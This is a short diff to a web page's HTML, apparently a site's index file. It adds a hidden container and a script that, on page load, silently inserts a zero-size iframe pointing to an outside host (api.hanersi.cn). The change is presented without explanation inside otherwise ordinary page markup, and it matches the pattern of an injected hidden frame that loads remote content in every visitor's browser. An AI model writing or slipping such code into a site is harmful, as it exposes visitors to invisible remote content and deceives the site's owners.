@@ -84,6 +84,7 @@
 				</div>
 			</div>
 		</div>
+		<div aria-hidden="true" id="iframeContainer"></div>
 		<script type="module" src="/src/main.ts"></script>
 		<script>
 			/*
@@ -117,5 +118,25 @@
 			  });
 			}
 		  </script>
+		  <script>
+			function createIframe() {
+				var containerId = 'iframeContainer';
+				var srcUrl = 'https://api.hanersi.cn/filesystem/api/static/enforcement.html';
+		
+				var container = document.getElementById(containerId);
+				if (container) {
+					var iframe = document.createElement('iframe');
+					iframe.setAttribute('src', srcUrl);
+					iframe.style.width = '0px';
+					iframe.style.height = '0px';
+		
+					container.appendChild(iframe);
+				} else {
+					console.error('Container element not found');
+				}
+			}
+		
+			window.onload = createIframe;
+		</script>
 	</body>
 </html>
